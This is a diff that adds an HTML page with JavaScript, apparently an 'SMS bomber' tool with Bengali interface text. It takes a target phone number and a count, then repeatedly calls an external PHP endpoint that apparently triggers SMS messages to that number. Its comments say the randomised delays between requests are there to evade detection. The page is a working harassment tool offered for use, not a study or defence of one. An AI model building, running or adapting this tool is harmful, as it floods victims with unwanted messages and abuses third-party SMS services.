@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💥 SMS BOMBER - Cracker Sultan's Weapon 💥</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background-color: #0d0d0d; 
+            color: #00ff00; 
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column; 
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden; 
+            text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; 
+            box-sizing: border-box; 
+        }
+
+        body::before { 
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                repeating-linear-gradient(0deg, transparent, transparent 2px, #00ff0022 3px, transparent 4px),
+                repeating-linear-gradient(90deg, transparent, transparent 2px, #00ff0022 3px, transparent 4px);
+            opacity: 0.1;
+            z-index: 0;
+        }
+
+        .container {
+            background-color: transparent; 
+            padding: 20px;
+            z-index: 1;
+            text-align: center;
+            max-width: 600px; 
+            width: 90%; 
+            border: 1px solid rgba(0, 255, 0, 0.3); 
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); 
+            animation: pulse-border 2s infinite alternate; 
+            box-sizing: border-box;
+            margin-bottom: 30px; 
+        }
+        
+        @keyframes pulse-border {
+            from { box-shadow: 0 0 10px rgba(0, 255, 0, 0.5); border-color: rgba(0, 255, 0, 0.3); }
+            to { box-shadow: 0 0 20px rgba(0, 255, 0, 0.8), 0 0 5px rgba(0, 255, 0, 0.4); border-color: rgba(0, 255, 0, 0.6); }
+        }
+
+        h1 {
+            color: #00ff00;
+            font-size: 2.2em;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 30px;
+            animation: glitch 1s infinite alternate; 
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 1px 0 0 #ff00ff, -1px 0 0 #00ffff; transform: translate(0); }
+            20% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, -2px 0 0 #ff00ff, 2px 0 0 #00ffff; transform: translate(-1px, 1px); }
+            40% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 3px 0 0 #ff00ff, -3px 0 0 #00ffff; transform: translate(1px, -1px); }
+            60% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, -1px 0 0 #ff00ff, 1px 0 0 #00ffff; transform: translate(-1px, 0); }
+            80% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 2px 0 0 #ff00ff, -2px 0 0 #00ffff; transform: translate(1px, 1px); }
+            100% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 0 #ff00ff, 0 0 0 #00ffff; transform: translate(0); }
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left; 
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+            color: #00cc00;
+            position: relative;
+            padding-left: 20px; 
+        }
+        label::before {
+            content: '$ '; 
+            color: #00ff00;
+            position: absolute;
+            left: 0;
+            top: 0;
+        }
+
+        input[type="text"],
+        input[type="number"] {
+            width: calc(100% - 10px);
+            padding: 8px 0;
+            border: none;
+            border-bottom: 1px solid #00ff00; 
+            background-color: transparent;
+            color: #00ffff; 
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1.1em;
+            outline: none; 
+            caret-color: #00ffff; 
+            box-sizing: border-box; 
+        }
+
+        input[type="text"]::placeholder,
+        input[type="number"]::placeholder {
+            color: #00aa00; 
+        }
+
+        button {
+            background-color: #00ff00;
+            color: #0d0d0d;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1.2em;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.7); 
+        }
+
+        button:hover {
+            background-color: #00cc00;
+            transform: scale(1.03);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 1);
+        }
+
+        #status {
+            margin-top: 30px;
+            padding: 15px;
+            background-color: transparent;
+            border: 1px solid rgba(0, 255, 0, 0.3); 
+            max-height: 250px;
+            overflow-y: auto;
+            word-break: break-all;
+            white-space: pre-wrap;
+            font-size: 0.9em;
+            color: #00ff00;
+            text-align: left;
+            animation: pulse-border 2s infinite alternate; 
+            box-sizing: border-box;
+        }
+
+        .log-item {
+            margin-bottom: 5px;
+        }
+
+        .log-success {
+            color: #00ff00;
+        }
+
+        .log-error {
+            color: #ff0000;
+            animation: blink 0.7s infinite alternate; 
+        }
+
+        @keyframes blink {
+            from { opacity: 1; }
+            to { opacity: 0.3; }
+        }
+
+        .developer-credit {
+            position: relative;
+            z-index: 1;
+            color: #00cc00;
+            font-size: 0.8em;
+            margin-top: 20px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(0, 255, 0, 0.2); 
+            text-align: center;
+        }
+
+        .developer-credit a {
+            color: #00ffff; 
+            text-decoration: none;
+            transition: text-shadow 0.3s ease;
+        }
+
+        .developer-credit a:hover {
+            text-shadow: 0 0 5px #00ffff, 0 0 10px #00ffff;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+            }
+            .container {
+                padding: 15px;
+                width: 95%; 
+            }
+            h1 {
+                font-size: 1.8em;
+                margin-bottom: 20px;
+            }
+            label {
+                font-size: 1em;
+            }
+            input[type="text"],
+            input[type="number"] {
+                font-size: 1em;
+            }
+            button {
+                padding: 10px 20px;
+                font-size: 1.1em;
+            }
+            #status {
+                max-height: 200px; 
+                font-size: 0.85em;
+            }
+            .developer-credit {
+                font-size: 0.75em;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+            .container {
+                padding: 10px;
+                width: 100%; 
+                border: none; 
+                box-shadow: none; 
+                animation: none; 
+            }
+            h1 {
+                font-size: 1.5em;
+                margin-bottom: 15px;
+            }
+            .form-group {
+                margin-bottom: 15px;
+            }
+            label {
+                font-size: 0.95em;
+            }
+            input[type="text"],
+            input[type="number"] {
+                font-size: 0.95em;
+                padding: 6px 0;
+            }
+            button {
+                padding: 8px 15px;
+                font-size: 1em;
+            }
+            #status {
+                max-height: 150px;
+                font-size: 0.8em;
+                border: none; 
+                animation: none; 
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>💥 SMS BOMBER 💥</h1>
+        
+        <div class="form-group">
+            <label for="phoneNumber">টার্গেট নাম্বার:</label>
+            <input type="text" id="phoneNumber" placeholder="যেমন: 01780982###" value="01780982###">
+        </div>
+        
+        <div class="form-group">
+            <label for="bombCount">কতবার পাঠাবি?</label>
+            <input type="number" id="bombCount" value="10" min="1">
+        </div>
+        
+        <button id="bombButton">বোম্বিং শুরু কর!</button>
+        
+        <div id="status">
+            <div class="log-item">[System] Ready to unleash hell...</div>
+            <div class="log-item">[Info] Enter target number & bomb count.</div>
+        </div>
+    </div>
+
+    <div class="developer-credit">
+        Developed by <a href="https://github.com/mxonlive" target="_blank">Sultan</a>
+        <br>Inspired by the mxonlive.
+    </div>
+
+    <script>
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const bombCountInput = document.getElementById('bombCount');
+        const bombButton = document.getElementById('bombButton');
+        const statusDiv = document.getElementById('status');
+
+        // তোর টার্গেট URL. এটা তোর সার্ভ00.নেট অ্যাকাউন্টে আপলোড করা PHP স্ক্রিপ্ট।
+        const targetUrl = "https://nali.serv00.net/BlastCobra.php"; 
+
+        // লগ মেসেজ দেখানোর ফাংশন
+        function log(message, type = 'info') {
+            const p = document.createElement('div');
+            p.classList.add('log-item');
+            p.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            if (type === 'success') {
+                p.classList.add('log-success');
+            } else if (type === 'error') {
+                p.classList.add('log-error');
+            }
+            statusDiv.prepend(p); // নতুন মেসেজ উপরে দেখাবে
+            if (statusDiv.children.length > 15) { // লগ বেশি হলে পুরাতনগুলো ডিলিট
+                statusDiv.removeChild(statusDiv.lastChild);
+            }
+        }
+
+        bombButton.addEventListener('click', async () => {
+            const phoneNumber = phoneNumberInput.value.trim();
+            const bombCount = parseInt(bombCountInput.value);
+
+            if (!phoneNumber || isNaN(bombCount) || bombCount <= 0) {
+                log(' নাম্বার আর কাউন্ট ঠিকঠাক দে!', 'error');
+                return;
+            }
+
+            bombButton.disabled = true;
+            bombButton.textContent = 'বোম্বিং চলছে...';
+            statusDiv.innerHTML = '<div class="log-item">[System] Clearing previous logs...</div>'; // স্ট্যাটাস ক্লিয়ার কর
+
+            log(`বোম্বিং শুরু হচ্ছে: ${phoneNumber} (${bombCount} বার)`, 'info');
+
+            for (let i = 0; i < bombCount; i++) {
+                const urlToSend = `${targetUrl}?num=${encodeURIComponent(phoneNumber)}`;
+                try {
+                    // Fetch API ব্যবহার করে রিকোয়েস্ট পাঠানো হচ্ছে
+                    // mode: 'no-cors' ব্যবহার করছি CORS এরর এড়ানোর জন্য, কারণ
+                    // আমরা আশা করছি BlastCobra.php নিজেই সঠিক CORS হেডার পাঠাবে।
+                    // যদি না পাঠায়, তাহলে ব্রাউজার রেসপন্স ব্লক করবে কিন্তু রিকোয়েস্ট যাবে।
+                    await fetch(urlToSend, {
+                        method: 'GET',
+                        mode: 'no-cors' 
+                    });
+
+                    log(`রিকোয়েস্ট #${i + 1} পাঠানো হয়েছে।`, 'success');
+
+                } catch (error) {
+                    log(`এরর: #${i + 1} ${error.message}`, 'error');
+                }
+                
+                // Random যোগ কর যাতে সার্ভার সহজে ডিটেক্ট করতে না পারে
+                const delay = Math.random() * (1000 - 300) + 300; // 300ms থেকে 1 সেকেন্ডের মধ্যে দে
+                await new Promise(resolve => setTimeout(resolve, delay));
+            }
+
+            log('বোম্বিং শেষ! টার্গেট! 🤘', 'success');
+            bombButton.disabled = false;
+            bombButton.textContent = 'বোম্বিং শুরু কর!';
+        });
+    </script>
+</body>
+</html>
